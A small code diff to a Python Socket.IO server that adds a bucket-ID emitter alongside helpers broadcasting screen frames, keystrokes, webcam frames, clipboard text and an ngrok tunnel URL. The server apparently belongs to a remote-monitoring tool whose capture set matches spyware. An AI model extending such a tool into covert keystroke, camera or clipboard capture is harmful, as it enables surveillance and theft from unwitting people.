@@ -85,11 +85,12 @@ def on_camera_off():
 
 
 # ── Broadcast helpers ─────────────────────────────────────────────────────────
-def broadcast_frame(b64):      socketio.emit("frame",          {"data": b64})
-def broadcast_key(char):       socketio.emit("key",            {"char": char})
-def broadcast_camera(b64):     socketio.emit("camera_frame",   {"data": b64})
-def broadcast_clipboard(text): socketio.emit("clipboard",      {"text": text})
-def broadcast_ngrok_url(url):  socketio.emit("ngrok_url",      {"url": url})
+def broadcast_frame(b64):        socketio.emit("frame",          {"data": b64})
+def broadcast_key(char):         socketio.emit("key",            {"char": char})
+def broadcast_camera(b64):       socketio.emit("camera_frame",   {"data": b64})
+def broadcast_clipboard(text):   socketio.emit("clipboard",      {"text": text})
+def broadcast_ngrok_url(url):    socketio.emit("ngrok_url",      {"url": url})
+def broadcast_bucket_id(bid):    socketio.emit("bucket_id",      {"id": bid})
 
 
 def run(host="0.0.0.0", port=9090):
